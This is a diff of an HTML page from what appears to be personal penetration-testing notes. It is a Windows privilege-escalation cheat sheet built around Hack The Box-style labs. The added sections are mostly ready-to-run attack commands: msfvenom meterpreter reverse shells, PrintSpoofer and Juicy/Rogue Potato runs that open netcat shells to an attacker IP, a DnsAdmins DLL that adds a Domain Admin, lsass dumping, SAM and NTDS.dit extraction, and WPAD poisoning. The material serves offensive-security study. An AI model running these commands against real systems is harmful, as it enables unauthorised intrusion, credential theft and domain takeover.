@@ -17,6 +17,7 @@
     <script src="/H4ckV4ult/components/navbar.js"></script>
     
     <div id="navbar-container"></div>
+
     <div class="main-container">
         <div class="sidebar">
             <h3>Quick content</h3>
@@ -34,79 +35,375 @@
                         <h3> Winpeas.exe </h3>
                         <pre><code class="language-powershell">wget https://github.com/peass-ng/PEASS-ng/releases/download/20250601-88c7a0f6/winPEASx64.exe -outfile wpeas.exe</code></pre>
                     </ul> 
-                </div>
 
-                <div class="notion-body">
                     <h2 id="Enumeration">Enumeration</h2>
                     <ul>
                         <pre><code class="language-powershell">systeminfo</code></pre>
-                        <pre><code class="language-powershell">wmic qfe</code></pre>
+                        <pre><code class="language-powershell">wmic qfe  #Get hotfixes</code></pre>
+                        <pre><code class="language-powershell">wmic product get name  #Get software installed, useful for finding CVEs to privesc</code></pre>
+                        <ul>
+                            <p>Same with powershell</p>
+                            <pre><code class="language-powershell">Get-WmiObject -Class Win32_Product |  select Name, Version</code></pre>
+                        </ul>
+                        <br>    
                         <pre><code class="language-powershell">whoami /priv</code></pre>
-                        <pre><code class="language-powershell">wohami /groups</code></pre>
-                        <pre><code class="language-powershell">net userdns</code></pre>
-                        <pre><code class="language-powershell">netstat -ano</code></pre>
-                        <pre><code class="language-powershell">route print</code></pre>
-                        <pre><code class="language-powershell">sc query windefend</code></pre>
-                        <pre><code class="language-powershell">Get-LAPSComputers</code></pre>
+                        <pre><code class="language-powershell">whoami /groups</code></pre>
+                        <ul>
+                            <p>Alternatively in a local machine</p>
+                            <pre><code class="language-powershell">net localgroup</code></pre>
+                            <pre><code class="language-powershell">net localgroup  GROUP_NAME</code></pre>
+                        </ul>
+                        <br>
+                        <pre><code class="language-powershell">net user USERNAME #Checking info about a users</code></pre>
+                        <pre><code class="language-powershell">netstat -ano #Shows all network connections, useful for identifying services only accessible from inside. Look for 127.0.0.1</code></pre>
+                        <pre><code class="language-powershell">route print #Shows routing table</code></pre>
+                        <pre><code class="language-powershell">sc query windefend #Shows if windows defender is running</code></pre>
+                        <pre><code class="language-powershell">Get-LAPSComputers  #Shows which computers use LAPS</code></pre>
+                        <pre><code class="language-powershell">tasklist /svc  #Show processes. It may help us to find a CVE for a specific software running in the host</code></pre>
+                        
                     </ul>
-                    
-                    <h2> Valuable files </h2>
+                
+                    <h2 id="Enum security controls">Enum security controls</h2>
+                        <ul>
+                            <h3>Windows Defender</h3>
+                            <ul>
+                            <p>In order to check if windows defender is active we could use the following command</p>
+                            <pre><code class="language-powershell">Get-MpComputerStatus</code></pre>
+                            </ul>
+                            
+                            <h3>AppLocker</h3>
+                            <ul>
+                            <p>App locker is a software for whitelisting programs on a computer. We can list the prohibited executables by using that in powershell</p>
+                            <p>This way we can list what is denied and what is permitted</p>
+                            <pre><code class="language-powershell">Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections</code></pre>
+                            <p>Check Applocker blocked apps of specific path</p>
+                            <pre><code class="language-powershell">Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\*.exe | findstr "Denied"</code></pre>
+                            
+                            <p>Here are listed all paths of powershell</p>
+                            <pre><code class="language-powershell">32-bit (x86) PowerShell executable	%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+64-bit (x64) Powershell executable	%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe
+32-bit (x86) Powershell ISE executable	%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell_ise.exe
+64-bit (x64) Powershell ISE executable	%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell_ise.exe</code></pre>    
+                            </ul>
+
+                            <h3>LAPS (Local Administrator Password Solution)</h3>
+                            <ul>
+                                <p>LAPS is used to randomize and rotate local administrator passwords on Windows hosts and prevent lateral movement. By using the following command we will be able to show the password expiration and if our user has rights the password in clear text</p>
+                                <pre><code class="language-powershell">Get-LAPSComputers</code></pre>
+                            </ul>    
+                        </ul>
+            
+                    <h2 id="Valuable files">Valuable files</h2>
                     <ul>
                         <p> Equivalent for .bash_history </p>
                         <pre><code class="language-powershell">C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</code></pre>
                         <p> Check if there are users with autologon</p>
                         <pre><code class="language-powershell">Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' | Select-Object AutoAdminLogon, DefaultUsername, DefaultDomainName, DefaultPassword</code></pre>
-                        
-                    </ul>    
-                </div>
-                
-
-                <div class="notion-body">
-                    <h2 id="Potatoes">Potatoes</h2>
+                    </ul>
+            
+        
+                    <h2 id="Windows privileges">Windows privileges</h2>
+                    <p>After exploiting any privilege it is possible that we encounter that we have privilege to do so but they are disabled. We can enable all of them by using this script <a class="notion-link" href="https://github.com/fashionproof/EnableAllTokenPrivs/blob/master/EnableAllTokenPrivs.ps1">here</a></p>
+                    <p>Simpy execute it by using</p>
+                    <pre><code class="language-powershell">.\EnableAllTokenPrivs.ps1</code></pre>
                     <ul>
-                        <p> Watch out for more information <a class="notion-link" href="https://jlajara.gitlab.io/Potatoes_Windows_Privesc"> here </a> </p> 
-                        <p> Use Sweet Potato to rule them all - Sweet Potato </p>
-                        <p> If you do not want to use Sweet Potato:</p>
+                        <h3>SeImpersonate</h3>
                         <ul>
-                            <li>If the machine is >= Windows 10 1809 & Windows Server 2019 - Try Rogue Potato</li>
-                            <li>If the machine is < Windows 10 1809 < Windows Server 2019 - Try Juicy Potato</li>
-                        </ul>
-                        <h3> Rogue Potatoes</h3>
-                        <h4> Musts </h4>
-                        <ul>
-                            <li>You need to have a machine under your control where you can perform the redirect and this machine must be accessible on port 135 by the victim</li>
-                            <li>Upload both exe files from the PoC</li>
-                        </ul>
-                        <p> Creation of a shell that will be used later. I recommend you to use nc or even metasploit</p>
-                        <pre><code class="language-bash">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.10 LPORT=9999 -f exe -o shell.exe</code></pre>
-                        <p> Execute that command in attacker machine to capture connection</p>
-                        <pre><code class="language-powershell">socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999</code></pre>
-                        <p> Execute that command in victim machine</p>
-                        <pre><code class="language-powershell">.\RoguePotato.exe -r VICTIM_IP -e ".\shell.exe" -l 9999</code></pre>
-                        <p> Execute that command in attacker machine</p>
-                        <pre><code class="language-powershell">nc -lvnp 9999</code></pre>
-                        <b>You can always avoid all this by getting a meterpreter shell and typing "getsystem"</b>
-
-                        <h3> Juicy Potatoes</h3>
-                        <p>Checkout the list of supported SO for the attack<a class="notion-link" href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md"> here</a></p>
-                        <h4> Musts </h4>
-                        <ul>
-                            <li><b>SeImpersonatePrivilege</b> must be enabled</li>
-                        </ul>
-                        <p> Creation of a shell that will be used later </p>
-                        <pre><code class="language-bash">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.10 LPORT=9999 -f exe -o shell.exe</code></pre>
-                        <p> Transfer Juicy potatos and shell file previously created and execute. If not CLID is passed the software will take a default one</p>
-                        <pre><code class="language-cmd">JuicyPotato.exe -l 1337 -p shell.exe -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}</code></pre>
-                        <p>Capture the reverse connection with proper tool and interpreter</p>
-                        <pre><code class="language-bash">sudo msfconsole
+                            <p>This privlege allow us to impersonate a client after authentication. Here we have several ways to exploit it</p>
+                            <ul>
+                                <h4>PrintSpoofer</h4>
+                                <ul>
+                                    <p>Can be run on WS 2016/2019 and W10 workstations</p>
+                                    <p>Download <a class="notion-link" href="https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip">nc.exe</a> and <a class="notion-link" href="https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0">PrintSpoofer.exe</a>. Transfer it to the victim machine and run</p>
+                                    <pre><code class="language-powershell">.\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"</code></pre>
+                                    <p>Capture the connection using netcat</p>
+                                    <pre><code class="language-bash">nc -lvnp 8443</code></pre>
+                                </ul>
+                                
+                                <p>For potatoes Watch out for more information <a class="notion-link" href="https://jlajara.gitlab.io/Potatoes_Windows_Privesc"> here </a> </p> 
+                                <ul>
+                                    <li>If the machine is >= Windows 10 1809 & Windows Server 2019 - Try Rogue Potato</li>
+                                    <li>If the machine is < Windows 10 1809 < Windows Server 2019 - Try Juicy Potato</li>
+                                </ul>
+                                <h4> Rogue Potatoes</h4>
+                                <ul>
+                                <b style="color: red;">This method is likely not to work MANUALLY i would recommend you to generate the payload using msfconsole, transfer it to the victim, capture the shell in a metasploit session and then type getsystem</b>
+                                <p>Creation of a shell that will be used later </p>
+                                <pre><code class="language-bash">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.10 LPORT=9999 -f exe -o shell.exe</code></pre>
+                                <p>Transfer the shell using certutil or others</p>
+                                <p>Capture the reverse connection with proper tool and interpreter</p>
+                                <pre><code class="language-bash">sudo msfconsole
 use exploit/multi/handler
 set payload windows/x64/meterpreter/reverse_tcp
 set LHOST 10.10.14.10
 set LPORT 9999</code></pre>
-                    </ul>
-                </div>
+                                <p>Finally type <b>getsystem</b> in the meterpreter console to automate the process</p> 
+                                <p>If you would like to perform manually the process here are the steps</p>
+                                
+                                <div class="button" onclick="toggleDiv()">Show content</div>
+                                <div id="foldedDiv" class="content">
+                                    <p>Download <a class="notion-link" href="https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip">nc.exe</a> and <a class="notion-link" href="https://github.com/antonioCoco/RoguePotato/releases/tag/1.0">RoguePotato.exe</a></p>
+                                    <p>Transfer both files using certutil or others. You can leave them inside any user home you can write or C:\Windows\Temp. Then run</p>
+                                    <p>In your attacker machine open two terminals. One with netcat</p>
+                                    <pre><code class="language-powershell">nc -lvnp 3001</code></pre>
+                                    <p>And another one with socat to redirect the connection</p>
+                                    <pre><code class="language-powershell">sudo socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999</code></pre>
+                                    <p>Then in the victim machine run the following</p>
+                                    <pre><code class="language-powershell">.\RoguePotato.exe -r ATTACKER_IP -e "C:\Tools\nc.exe ATTACKER_IP 3001 -e cmd.exe" -l 9999</code></pre>    
+                                </div>    
+                            </ul>
 
-                <div class="notion-body">
+                                <h4> Juicy Potatoes</h4>
+                                <ul>
+                                <b style="color: red;">This method is likely not to work MANUALLY i would recommend you to generate the payload using msfconsole, transfer it to the victim, capture the shell in a metasploit session and then type getsystem</b>    
+                                <p>Creation of a shell that will be used later </p>
+                                <pre><code class="language-bash">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.10 LPORT=9999 -f exe -o shell.exe</code></pre>
+                                <p>Transfer the shell using certutil or others</p>
+                                <p>Capture the reverse connection with proper tool and interpreter</p>
+                                <pre><code class="language-bash">sudo msfconsole
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 10.10.14.10
+set LPORT 9999</code></pre>
+                                <p>Finally type <b>getsystem</b> in the meterpreter console to automate the process</p> 
+                                <p>If you would like to perform manually the process here are the steps</p>
+                                <div class="button" onclick="toggleDiv()">Show content</div>
+                                <div id="foldedDiv" class="content">
+                                    <p>Download <a class="notion-link" href="https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip">nc.exe</a> and <a class="notion-link" href="https://github.com/ohpe/juicy-potato/releases/tag/v0.1">JuicyPotato.exe</a></p>
+                                    <p>Transfer both files using certutil or others. You can leave them inside any user home you can write or C:\Windows\Temp. Then run</p>
+                                    <p>Open a netcat listener</p>
+                                    <pre><code class="language-powershell">nc -lvnp 8443</code></pre>
+                                    <p>And then execute the following in the target machine</p>
+                                    <b>Have in mind that -l parameter it is used to specify an open RPC port which will be used for the exploitation. In case that port isn't open just perform an nmap in look for open RPC ports. Normally high number ports</b>
+                                    <pre><code class="language-powershell">c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *</code></pre>
+                                </div>
+
+                                </ul>    
+                            </ul>
+                        </ul>
+
+                        <h3>SeDebugPrivilege</h3>
+                        <ul>
+                            <p>This policy setting determines which users can attach to or open any process, even a process they do not own. This user right provides access to sensitive and critical operating system components.</p>
+                            <p>This permission allow us to lssas process memory. There are several ways to do so. We can do it using procdump from sysinternals and then load it to mimikatz</p>
+                            <pre><code class="language-powershell">procdump.exe -accepteula -ma lsass.exe lsass.dmp</code></pre>
+                            <p>In case we are able to perform an RDP to the victim we can do it directly from the task manager. <b>Task Manager</b> -> <b>Details</b> -> <b>lsass.exe</b> <b>right click</b> -> <b>Create dump file</b></p>
+                            <h4>RCE by creating a child process</h4>
+                            <ul>
+                                <p>By using this <a class="notion-link" href="https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1">PoC</a> we can elevate our privileges to SYSTEM by launching a child process and using the elevated rights grated via SeDebugPrivilege</p>
+                                <p>In order to use it transfer it to the target machine and run the following</p>
+                                <pre><code class="language-powershell">. .\psgetsys.ps1
+ImpersonateFromParentPid -ppid PID_OF_WINLOGON.EXE -command cmd.exe</code></pre>
+                                
+                                <p>In order to check the process PID we can run <b>tasklist</b> to get a list of running processes and choose the PID from <b>winlogon.exe</b> since this process is executed by SYSTEM. Obiously chose a process that is being used by SYSTEM to execute the command using SYSTEM privileges</p>
+                                <p>We can also execute the command but by using the Get-Process to acquire to PID just by issuing the name of the process. Example:</p>
+                                <pre><code class="language-powershell">ImpersonateFromParentPid -ppid (Get-Process lsass).Id -command cmd.exe</code></pre>
+                                
+                                <p>In case we aren't in a graphical environment this will not work. But we can use netcat to recive a reverse shell</p>
+                                <pre><code class="language-powershell">ImpersonateFromParentPid -ppid 5168 -command C:\Tools\nc.exe -cmdargs "10.10.14.252 3001 -e cmd.exe"</code></pre>
+                            </ul>
+                        </ul>
+
+                        <h3>SeTakeOwnershipPrivilege</h3>
+                        <ul>
+                            <p>Grants a user the ability to take ownership of any "securable object," meaning Active Directory objects, NTFS files/folders, printers, registry keys, services, and processes.</p>
+                            <p>In case we would like to view the content of some especific file we could take advantatge of that privilege. First show who is the owner of that specific file. In case the owner is <b>empty</b> you need to perform the same process on the folder where the file iss</p>
+                            <pre><code class="language-powershell">Get-ChildItem -Path 'C:\folder/file.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}</code></pre>
+                            <p>Now attempt to take ownership of that specific file </p> 
+                            <pre><code class="language-powershell">takeown /f 'C:\TakeOwn\flag.txt'</code></pre>
+                            <p>Check the ownership again to verify. Eventhough we won't be able to read the file content. So we need to change the iacls</p>
+                            <pre><code class="language-powershell">icacls 'C:\TakeOwn\flag.txt' /grant htb-student:F</code></pre>
+                            <h4>Interesting files to apply</h4>
+                            <ul>
+                                <p>We won't be able to read content from SAM but there could be the case where interesting files are located inside our target machine. Here is a list of few of them</p>
+                                <pre><code class="language-powershell">c:\inetpub\wwwwroot\web.config #Web config file
+C:\Windows\repair\sam #Backup files 
+C:\Windows\repair\system
+C:\Windows\repair\software, C:\Windows\repair\security
+C:\Windows\system32\config\SecEvent.Evt
+C:\Windows\system32\config\default.sav
+C:\Windows\system32\config\security.sav
+C:\Windows\system32\config\software.sav
+C:\Windows\system32\config\system.sav
+#Maybe some .kdbx (keypass database file), OneNote notebooks, password.*, pass.*, creds.*, scripts or other configuration file                         </code></pre>
+                            </ul>
+                        </ul>
+
+                        <h3>SeBackupPrivilege</h3>
+                        <ul>
+                           <h4>Copying any file</h4>
+                           <ul>
+                            <p>Members of <b>Backup Operators</b> are assigned with <b>SeBackupPrivilege</b>. This privlege allow us to traverse any folder and list the folder contents. This will let us copy a file from a folder even if there is no access control entry (ACE) for us. But we can't do this by using standalone copy function.</p>
+                            <p>In order to do so we will use this <a class="notion-link" href="https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug">PoC</a> .Download both dll and import them by using</p>
+                            <pre><code class="language-powershell">Import-Module .\SeBackupPrivilegeUtils.dll
+Import-Module .\SeBackupPrivilegeCmdLets.dll</code></pre>
+                            <p>Now you are able to copy any file by using</p>
+                            <pre><code class="language-bash">Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' 'C:\Windows\Temp\Contract.txt'</code></pre>
+                            <p>Alternatively we can use robocopy</p>
+                            <pre><code class="language-powershell">robocopy /B E:\Windows\NTDS .\ntds ntds.dit</code></pre>
+                            
+                            </ul>
+
+                            <h4 id="Copying_NTDS.dit">Copying NTDS.dit</h4>
+                            <ul>
+                                <p>In other sections of this page we already documented how to export NTDS.dit. <a class="notion-link" href="#Exporting NTDS.dit">here</a> even though in this case we will use the utility present in WS called diskshadow to create a snmapshoot (shadow copy) of C:\ drive</p>
+                                <p>The following process is done since NTDS.dit file can't be accesed since the file is always being used. Same happens with lsass.exe or SAM</p>
+                                <pre><code class="language-powershell">PS C:\htb> diskshadow.exe
+
+Microsoft DiskShadow version 1.0
+Copyright (C) 2013 Microsoft Corporation
+On computer:  DC,  10/14/2020 12:57:52 AM
+
+DISKSHADOW> set verbose on
+DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
+DISKSHADOW> set context clientaccessible
+DISKSHADOW> set context persistent
+DISKSHADOW> begin backup
+DISKSHADOW> add volume C: alias cdrive
+DISKSHADOW> create
+DISKSHADOW> expose %cdrive% E:
+DISKSHADOW> end backup
+DISKSHADOW> exit
+
+PS C:\htb> dir E:
+
+#Now you should be able to see that the E:\ drive has all contents from C:\ drive</code></pre>
+                                 <h5>Errors</h5>
+                                 <ul>
+                                    <p>In case you see that when doing <b> add volume C: alias cdrive</b> it says</p>
+                                    <pre><code class="language-powershell">The volume has already been added to the shadow copy set.</code></pre>
+                                    <p>Just hit</p>
+                                    <pre><code class="language-powershell">DISKSHADOW> create</code></pre>
+                                    <p>Then i will start performing the shadow copy and will output the following line among others</p>
+                                    <pre><code class="language-powershell">Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1</code></pre>
+                                    <p>That way you can simply perform the copy</p>
+                                    <pre><code class="language-powershell">Copy-FileSeBackupPrivilege '\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit' 'C:\Tools\ntds.dit'</code></pre>
+                                    
+                                     
+                                 </ul>  
+
+                                 <p>Then simply go the the path where ntds.dit resides and copy the file using the <b>Copy-FileSeBackupPrivilege already imported</b></p>
+                                  <pre><code class="language-powershell">Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit</code></pre>
+                                 <p>In order to view those files using powershell we can do the following</p>
+                                 <div class="button" onclick="toggleDiv()">Show content</div>
+                                 <div id="foldedDiv" class="content">
+                                    <b style="color: red;">WARNING: You need to be Administrator to perform this operations</b>
+                                    <p>Import the following module which can be downloaded from <a class="notion-link" href="https://github.com/MichaelGrafnetter/DSInternals/blob/master/Src/DSInternals.PowerShell/DSInternals.psd1">here</a></p>
+                                    <pre><code class="language-bash">Import-Module .\DSInternals.psd1</code></pre>
+                                    <p>In order to use this you must have a copy of the system hive. You could obtain it by using any of the previously seen commands</p>
+                                    <p>Use the following commands to extract it</p>
+                                    <pre><code class="language-bash">$key = Get-BootKey -SystemHivePath .\SYSTEM
+Get-ADDBAccount -All -DBPath .\ntds.dit -BootKey $key #For all users
+Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key  #Only for administrator user</code></pre>
+                                </div>   
+                            </ul>
+
+                            <h4>Copying SAM and SYSTEM registry hives</h4>
+                            <ul>
+                                <p>If you have that privilege you'll able to dump SAM and SYSTEM regitry hives. More information can be found <a class="notion-link" href="#Extracting SAM">here</a></p>
+                            </ul>
+
+                        </ul>
+                    </ul>
+
+                    <h2 id="Windows groups">Windows groups</h2>
+                    <ul>
+                        <p>In case you land on a user that is in one of this groups you could escalate your privileges</p>
+                        <h3>Event Log Readers</h3>
+                            <ul>    
+                            <p>Sometimes we can find valuable information in logs, we can read them by using <b>wevtutil or Get-WinEvent in powershell</b></p>
+                            <p>Have in mind that we only be able to read logs if we are in the group "Event Log Readers" or if we are an Administrator</p>
+                            <p>All logs can be found in <b>C:\Windows\System32\winevt\Logs\</b></p>
+                            <h3>wevtutil</h3>
+                            <ul>
+                                <p><b>qe</b> for specifying the log file, <b>rd</b> indicates reverse true which orders events from new to old, <b>/f</b> defines the output as text</p>
+                                <pre><code class="language-powershell">wevtutil qe Security /rd:true /f:text | Select-String "/user"</code></pre>
+                                <p>In case we would like to avoid certain string in our search we could use</p>
+                                <pre><code class="language-powershell">wevtutil qe Security /rd:true /f:text | Select-String "mary" | Where-Object { $_ -notmatch "SeAssignPrimaryTokenPrivilege"}</code></pre>
+
+                                <p>We can also specify logs from a remote computer. In this case we need to specify a username and password</p>
+                                <pre><code class="language-powershell">wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"</code></pre>
+                            </ul> 
+                            </ul>   
+
+                            <h3>Get-WinEvent</h3>
+                            <ul>
+                                <p>Searching for events that contain "/user" parameter</p>
+                                <pre><code class="language-powershell">Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}</code></pre>
+                            </ul> 
+                       <h3>DnsAdmins</h3>
+                       <ul>
+                        <p>Members of the DnsAdmins group have access to DNS information on the network. Since windows DNS service supports custom plugins and call functions from them to resolve name queries that are not in the scope of any locally hosted DNS zones this service is vulnerable to privilege escalation or information leakage</p>
+                        <p>The DNS service runs as NT AUTHORITY\SYSTEM. The steps to escalate are the following</p>
+                        <p>Generate a malicious DLL and transfer it to the victim machine</p>
+                        <pre><code class="language-powershell">msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll</code></pre>
+                        
+                        <p>Load DLL as memeber of DnsAdmins. We can check if are inside this group by using <b>Get-ADGroupMember -Identity DnsAdmins</b></p>
+                        <pre><code class="language-powershell">dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll</code></pre>
+                        <p>Now, in order to trigger that .dll the DNS service must be restarted since the plugin will be loaded in the next start. Just by being in the DnsAdmins group does not grant us from having the privilege to restart the DNS service we can check it using</p>
+                        <b>I recommend you to perform all the following actions from CMD. Powershell does not work</b>
+                        <pre><code class="language-powershell">wmic useraccount where name="netadm" get sid #View your SID
+sc.exe sdshow DNS</code></pre>
+                        <p>The output will be similar to this one, where the first <b>A</b> equals to Allow and <b>RPWP</b> are the permissions to stop and start the DNS service</p>
+                        <pre><code class="language-powershell">(A;;RPWP;;;S-1-5-21-669053619-2741956077-1013132368-1109)
+A: Allow</code></pre>
+                        <p>Stoping and starting the DNS service</p>
+                        <pre><code class="language-powershell">sc stop dns
+sc start dns</code></pre>
+
+                        <h4>Cleaning up</h4>
+                        <ul>
+                        <p>In order to leave the environment as clean as possible we must remove the dll that we previously loaded. Here are the steps to do so</p>    
+                        <div class="button" onclick="toggleDiv()">Show content</div>
+                                <div id="foldedDiv" class="content">
+                                    <p>Of course all this process must be done with system privielges. First check that the DLL is loaded.</p>
+                                    <pre><code class="language-powershell">reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters</code></pre>    
+                                    <p>Now delete it</p>
+                                    <pre><code class="language-powershell">reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll</code></pre>    
+                                </div>
+                        </ul>
+                        
+                        <h3>WPAD poisoning</h3>
+                        <ul>
+                            <p>WPAD menas Web Proxy Auto-Discovery Protocol. Is a mechaninsm used by a lot of sistems, specially browsers and Windows operating system. This is used in order to discover what proxy use in order to access internet and they ddo it automatically without needing to manually configure a proxy</p>
+                            <p>This could be dangerous since in case an attacker setups it's own server i could intercep all traffic which is going out to internet</p>
+                            <p>By default there is a parameter that blocks this attack but if we are inside dnsadmins group we could be able to disable it. Once this is done we could use a tool such as <b>Responder or Inveigh</b> to capture NTLMv2 hashes</p>
+                            <p>In order to disable the Global query Block list use the following command</p>
+                            <pre><code class="language-powershell">Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local</code></pre>  
+                            <p>Now add the WPAD pointing to your attacker machine </p> 
+                            <pre><code class="language-powershell">Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address ATTACKER_IP</code></pre>
+                            
+                        </ul>
+                    </ul>
+
+                    <h3>Hyper-V Administrators</h3>
+                    <ul>
+                        <p>The Hyper-V administrator group allow us to create, start, remove VMs and manage virtual disks. All operations in hyper-v are performed by NT AUTHORITY\SYSTEM and due that fact we are able to escalte our privileges</p>
+                        <p>Whenever you create a VM the process vmms.exe impersonates the user but when you delete a machine the process is being done by NT AUTHORITY\SYSTEM. Now we can create a hardlink pointing from the VHDX file created when we create the machine to a random file that we would like. Finally to abuse that we will remove the VHDX file and then remove the VM which will result in that SYSTEM will look for the VHDX file but will be redirected your our convinence file which will give it full control over it</p>
+                        <p>Here we have a <a class="notion-link" href="https://github.com/decoder-it/Hyper-V-admin-EOP/tree/master">POC</a> that automates all this process. Remember to change the line of targetfile to target the file you want to get full control</p> 
+                        <pre><code class="language-powershell">$targetfile="c:\windows\system32\license.rtf"</code></pre>  
+                    </ul>
+
+                    <h3>Print Operators</h3>
+                    <ul>
+                        <p>Print Operators is another highly privileged group, which grants its members the <b>SeLoadDriverPrivilege</b> If we perform the <b>whoami /priv</b> and don't see <b>SeLoadDriverPrivilege</b> privilge enabled will have bypass the UAC</p>
+                        #Finish the process of bypassing the UAC
+                        <p>Once we see the privilege we will upload the driver the driver Capcom.sys which contains a functionallity to allow any user to execute shellcode with SYSTEM privielges. Here are the steps</p>
+                        <p>We will use the tool <a class="notion-link" href="https://github.com/3gstudent/Homework-of-C-Language/blob/master/EnableSeLoadDriverPrivilege.cpp">EnableSeLoadDriverPrivilege.cpp</a> download the file add the following libraries and compile it</p>
+
+
+                        <pre><code class="language-powershell">#include &lt;windows.h&gt;
+#include &lt;assert.h&gt;
+#include &lt;winternl.h&gt;
+#include &lt;sddl.h&gt;
+#include &lt;stdio.h&gt;
+#include "tchar.h"</code></pre>
+                        <p>Compile the code by using</p>  
+                        open it visual studio and go to tools and command line powershell developer tools  
+                        <pre><code class="language-powershell"> cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp</code></pre>
+                        
+                        
+
                     <h2 id="BloodyAD">BloodyAD</h2>
                     <ul>
                         <h3>Adding users to groups</h3>
@@ -186,9 +483,7 @@ $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\dam
                         </ul>
 
                     </ul>
-                </div>
 
-                <div class="notion-body">
                     <h2 id="Credential hunting">Credential hunting</h2>
                     <ul>    
                         <p>Once we gained access to a computer/domain we can perform credential huntgin by using <b>LaZagne</b></p>
@@ -196,50 +491,76 @@ $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\dam
                         <p>Also we can use findstr to discover some filetypes</p>
                         <pre><code class="language-powershell">findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml</code></pre>
                     </ul>
-                </div>
 
-                <div class="notion-body">
                     <h2 id="Extracting SAM">Extracting SAM</h2>
                     <ul>
                         <p>In case you found that you have enough privilege to extract config files from Windows like SAM, SYSTEM or SECURITY you could do so by doing...</p>
                         <p>Remember that if your user has admincount = 1 and SeBackupPrivilege enabled (whoami /priv) you could perform the same process</p>
-                        <pre><code class="language-powershell">reg  save hklm\sam C:\Users\emily.oscars.CICADA\Documents\sam.hive
+                        <pre><code class="language-powershell">reg save hklm\sam C:\sam.hive
 reg.exe save hklm\system C:\system.save
 reg.exe save hklm\security C:\security.save</code></pre>
-                        <p>Then extract the file with download utility (evil-winrm) and use pypkatz/hashcat/secretsdump to view the hashses and perform a pass the hash attack</p>
-                        <pre><code class="language-powershell">pypykatz registry --sam sam.hive system.hive</code></pre>
-                        <p>Remember that the password hash will have the following form (uid:rid:lmhash:nthash) the important one is the last one nthash. Situate all hashes on a file and attempt to crack them</p>    
-                        
+                        <p>In order to view the content of those files</p>
+                        <h3>From Windows</h3>
+                        <ul>
+                            <p>Upload or use mimikatz in case it's already on the machine</p>
+                            <p>First I recommend you to create a log file since some times you can't scroll</p>
+                            <pre><code class="language-powershell">mimikatz # log C:\log.txt
+mimikatz # lsadump::sam</code></pre>
+                        </ul>
+                        <h3>From Linux</h3>
+                        <ul>
+                            <p>Then extract the 3 files with download utility (evil-winrm) and use pypkatz/secretsdump to view the hashes and perform a pass the hash attack</p>
+                            <pre><code class="language-powershell">pypykatz registry --sam sam.hive system.hive  #Using pypykatz
+impacket-secretsdump -sam 'sam.hive' -security 'security.save' -system 'system.save' LOCAL    #Using secretsdump</code></pre>
+                            <p>Remember that the password hash will have the following form <b>(uid:rid:lmhash:nthash)</b> the important one is the last one <b>nthash</b>. Situate all hashes on a file and attempt to crack them</p>
+                        </ul>
+                            
                         <h3>Alternative ways to do it</h3>
                         <ul>
                             <p>You can automate this process with netexec</p>
-                            <pre><code class="language-powershell">netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa</code></pre>
-                        </ul>    
+                            <pre><code class="language-powershell">netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam</code></pre>
+                        </ul>
                     </ul>
-                </div>
 
-                <div class="notion-body">
                     <h2 id="Extracting LSASS">Extracting LSASS</h2>
